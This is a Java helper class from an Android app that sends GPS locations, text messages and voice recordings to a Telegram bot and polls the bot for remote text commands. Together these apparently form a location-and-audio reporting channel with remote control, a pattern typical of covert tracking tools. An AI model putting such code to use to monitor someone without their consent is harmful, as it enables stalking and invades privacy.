package com.example.gpsstandalone;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class TelegramHelper {

    private final Context context;
    private final RequestQueue requestQueue;

    public TelegramHelper(Context context) {
        this.context = context.getApplicationContext();
        this.requestQueue = Volley.newRequestQueue(this.context);
    }

    // Kirim lokasi dengan pesan
    public void sendLocation(String token, String chatId, double lat, double lon, String caption) {
        try {
            String mapLink = "https://maps.google.com/?q=" + lat + "," + lon;
            String fullMessage = caption + "\n\n" + mapLink;

            String encodedMessage = URLEncoder.encode(fullMessage, "UTF-8");
            String url = "https://api.telegram.org/bot" + token +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedMessage;

            Log.d("TelegramHelper", "Sending location to Telegram");

            StringRequest request = new StringRequest(Request.Method.GET, url,
                    response -> Log.d("TelegramHelper", "Location sent: " + response),
                    error -> Log.e("TelegramHelper", "Volley error: " + error.toString()));

            requestQueue.add(request);
        } catch (Exception e) {
            Log.e("TelegramHelper", "Exception in sendLocation: " + e.getMessage());
        }
    }

    // Kirim pesan teks biasa
    public void sendMessage(String token, String chatId, String message) {
        try {
            String encodedMessage = URLEncoder.encode(message, "UTF-8");
            String url = "https://api.telegram.org/bot" + token +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedMessage;

            Log.d("TelegramHelper", "Sending message: " + message);

            StringRequest request = new StringRequest(Request.Method.GET, url,
                    response -> Log.d("TelegramHelper", "Message sent: " + response),
                    error -> Log.e("TelegramHelper", "Volley error: " + error.toString()));

            requestQueue.add(request);
        } catch (Exception e) {
            Log.e("TelegramHelper", "sendMessage Exception: " + e.getMessage());
        }
    }


    public void checkCommands(String token, String chatId, CommandCallback callback) {
        String url = "https://api.telegram.org/bot" + token + "/getUpdates";
        SharedPreferences prefs = context.getSharedPreferences("config", Context.MODE_PRIVATE);
        int lastUpdateId = prefs.getInt("last_update_id", 0);

        StringRequest request = new StringRequest(Request.Method.GET, url,
                response -> {
                    try {
                        JSONObject json = new JSONObject(response);
                        if (json.getBoolean("ok")) {
                            JSONArray result = json.getJSONArray("result");
                            for (int i = 0; i < result.length(); i++) {
                                JSONObject update = result.getJSONObject(i);
                                int updateId = update.getInt("update_id");

                                if (updateId <= lastUpdateId) continue; // skip old commands

                                if (update.has("message")) {
                                    JSONObject message = update.getJSONObject("message");
                                    if (message.has("text")) {
                                        String text = message.getString("text");
                                        callback.onCommand(text);

                                        // simpan update id terakhir agar tidak dobel
                                        prefs.edit().putInt("last_update_id", updateId).apply();
                                        break;
                                    }
                                }
                            }
                        }
                    } catch (Exception e) {
                        Log.e("TelegramHelper", "checkCommands Exception: " + e.getMessage());
                    }
                },
                error -> Log.e("TelegramHelper", "checkCommands error: " + error.toString()));

        requestQueue.add(request);
    }



    public void sendVoice(String token, String chatId, File file) {
        String url = "https://api.telegram.org/bot" + token + "/sendVoice";

        VolleyMultipartRequest multipartRequest = new VolleyMultipartRequest(Request.Method.POST, url,
                response -> Log.d("TelegramHelper", "Voice sent successfully"),
                error -> Log.e("TelegramHelper", "Error sending voice: " + error.getMessage())) {

            @Override
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<>();
                params.put("chat_id", chatId);
                return params;
            }

            @Override
            public Map<String, DataPart> getByteData() {
                Map<String, DataPart> params = new HashMap<>();
                params.put("voice", new DataPart("record.3gp", FileUtils.readFileToBytes(file)));
                return params;
            }
        };

        requestQueue.add(multipartRequest);
    }


    public interface CommandCallback {
        void onCommand(String command);
    }



}
